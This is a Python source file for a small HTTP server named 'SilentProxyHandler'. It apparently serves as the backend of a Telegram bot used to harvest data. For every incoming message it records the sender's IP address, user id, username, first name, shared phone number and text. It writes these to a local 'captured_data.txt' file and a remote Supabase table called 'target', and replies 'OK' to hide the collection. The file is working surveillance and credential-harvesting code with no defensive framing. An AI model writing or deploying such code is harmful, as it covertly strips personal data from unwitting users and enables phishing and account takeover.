from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import os
import requests
from supabase import create_client, Client


SUPABASE_URL = os.environ.get("SUPABASE_URL", "YOUR_SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "YOUR_SUPABASE_KEY")
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY) if SUPABASE_URL != "YOUR_SUPABASE_URL" else None

class SilentProxyHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        
        client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
        if ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()

        try:
            data = json.loads(post_data.decode('utf-8'))
            
            message = data.get('message', {}) or data.get('callback_query', {}).get('message', {})
            user = message.get('from', {})
            contact = message.get('contact', {})
            chat_id = message.get('chat', {}).get('id')
            text = message.get('text', '')

            catch_report = {
                "client_ip": client_ip,
                "user_id": str(user.get('id')),
                "username": user.get('username'),
                "first_name": user.get('first_name'),
                "phone_number": contact.get('phone_number'), 
                "input_text": text,
                "raw_payload": data
            }

            print("\n[+] --- logged to memory ---")
            print(json.dumps(catch_report, indent=4, ensure_ascii=False))
            
            with open("captured_data.txt", "a", encoding="utf-8") as f:
                f.write(json.dumps(catch_report, ensure_ascii=False) + "\n" + "="*50 + "\n")
            
            if supabase:
                try:
                    supabase.table("target").insert(catch_report).execute()
                    print("[+] Data successfully pushed to Supabase database!")
                except Exception as db_err:
                    print("[-] Supabase push error:", db_err)

        except Exception as e:
            print("[-] error:", e)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

def run(server_class=HTTPServer, handler_class=SilentProxyHandler):
    port = int(os.environ.get("PORT", 10000))
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"colonel went form here {port}... (Server Active)")
    httpd.serve_forever()

if __name__ == '__main__':
    run()
